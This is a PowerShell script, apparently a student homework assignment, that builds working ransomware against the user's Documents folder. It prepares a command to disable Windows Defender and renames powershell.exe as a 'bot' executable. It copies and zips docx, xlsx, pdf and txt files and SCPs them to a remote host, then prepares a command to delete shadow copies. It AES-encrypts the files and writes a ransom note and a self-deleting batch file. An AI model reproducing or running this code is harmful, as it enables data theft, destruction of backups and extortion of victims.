# Little directory adjustment for running the below
cd C:\Users\Christopher\Desktop\School\SYS_320_SP22\Week13\homework
# Prerequisites
Set-ExecutionPolicy Bypass -Scope CurrentUser
#ignore red text just says that it will only be set for current shell which is all we want
# To block the user from worrying about this we clear the terminal with the below
cls

# Partial step3 input
# Disable Windows Defender
$DisWinDefend = "Set-MpPreference -DisableRealtimeMonitoring $true -EnableControlledFolderAccess Disabled"
$DisWinDefend | Out-File disable.txt
# End of partial step3 input

# Copy powershell.exe to home directory
Copy-Item -Path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Destination "C:\Users\Christopher\Desktop\School\SYS_320_SP22\Week13\homework"

# Create a random number to add to the file.
$sbRand = Get-Random -Minimum 1000 -Maximum 9876

# Create the location to save the bot
$newName = "EnNoB-" + $sbRand + ".exe"

# Rename the powershell.exe file 
Rename-Item -Path "C:\Users\Christopher\Desktop\School\SYS_320_SP22\Week13\homework\powershell.exe" -NewName $newName

# Check that the file exists

# If statement checks the return of the command
if (dir -path C:\Users\Christopher\Desktop\School\SYS_320_SP22\Week13\homework\$newName){

    # If true it writes the below text
    Write-Host -BackgroundColor "Green" -ForegroundColor "black" "The file,"$newName", has been found"
}
Else {
    # If false it returns built in powershell error message saying it does not exist
    
    
    # cls removes this message to hide it from user
    #cls
    # This is the error message we want the user to see
    #Write-Host -BackgroundColor "Red" -ForegroundColor "White" "The file does not exist" 
}

# Part of Step3 input
# Create the directory name
$dirName = "Documents" + $sbRand

# Create a directory to move filesystem into
mkdir $dirName

# Search Filesystem (Documents folder) for docx, xlsx, pdf, and txt files

# Gather the following files: docx, xlsx, pdf, and txt
# Loop through them and copy each to new folder/directory
Get-ChildItem -Recurse -Include *.pdf,*.xlsx,*.docx,*.txt -Path .\Documents | Get-Item | foreach `
{Copy-Item $_ -Destination C:\Users\Christopher\Desktop\School\SYS_320_SP22\Week13\homework\$dirName\}

# Zip the folder/directory created above
Compress-Archive $dirName $dirName

# SCP the zipped file to remote device
Set-SCPItem -ComputerName '192.168.6.71' -Port 2222 -Credential $credential -Destination "/home/christopher.mchugh/" -Path .\$dirName.zip

# Delete System Shadows
$RmRestore = "vssadmin delete shadows /all"
$RmRestore | Out-File RM.txt

# End of Step3 partial input

<#
Input of step2.ps1.
It makes sense to perform before the ransom file is created.
#>
$step2 = @'
# Invoke-AESEncryption
<# 
.SYNOPSIS 
Encryptes or Decrypts Strings or Byte-Arrays with AES 
 
.DESCRIPTION 
Takes a String or File and a Key and encrypts or decrypts it with AES256 (CBC) 
 
.PARAMETER Mode 
Encryption or Decryption Mode 
 
.PARAMETER Key 
Key used to encrypt or decrypt 
 
.PARAMETER Text 
String value to encrypt or decrypt 
 
.PARAMETER Path 
Filepath for file to encrypt or decrypt 
 
.EXAMPLE 
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 
 
Description 
----------- 
Encrypts the string "Secret Test" and outputs a Base64 encoded cipher text. 
 
.EXAMPLE 
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" 
 
Description 
----------- 
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text. 
 
.EXAMPLE 
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin 
 
Description 
----------- 
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes" 
 
.EXAMPLE 
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin.aes 
 
Description 
----------- 
Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin" 
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".pysa"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}

# Task 1
# Create a listing of pdf, xlsx, and docx files in Documents folder and Export to CSV
Get-ChildItem -Recurse -Include *.pdf,*.xlsx,*.docx -Path .\Documents | Export-Csv `
-Path files.csv

# Task 2
# Import CSV file.
$fileList = Import-Csv -Path .\files.csv #-Header FullName

# Loop through the CSV file
foreach ($f in $fileList) {

    # Encrypt the file
    Invoke-AESEncryption -mode encrypt -key "secret" -Path $f.FullName


}

# Task 3
# Create a file called update.bat that will contain the code to delete step2.ps1

$removeSteps = "del C:\Users\Christopher\Desktop\School\SYS_320_SP22\Week13\homework\step2.ps1, del C:\Users\Christopher\Desktop\School\SYS_320_SP22\Week13\homework\step1.ps1"
$removeSteps| Out-File -FilePath .\update.bat
'@

$step2 | Out-File -FilePath .\step2$sbRand.ps1


# Create Readme.READ file
$ransom = "If you want your files restored, please contact me at christopher.mchugh@mymail.champlain.edu. I look forward to doing business with you."

$ransom | Out-File -FilePath C:\Users\Christopher\Desktop\School\SYS_320_SP22\Week13\homework\Readme.READ

# Check that the Readme.READ file exists

if (dir -path C:\Users\Christopher\Desktop\School\SYS_320_SP22\Week13\homework\Readme.READ){

    # If true it writes the below text
    Write-Host -BackgroundColor "Green" -ForegroundColor "black" "The file, Readme.READ, has been found"
}
Else {
    # If false it returns built in powershell error message saying it does not exist
    
    
    # cls removes this message to hide it from user
    #cls
    # This is the error message we want the user to see
    #Write-Host -BackgroundColor "Red" -ForegroundColor "White" "The file does not exist" 
}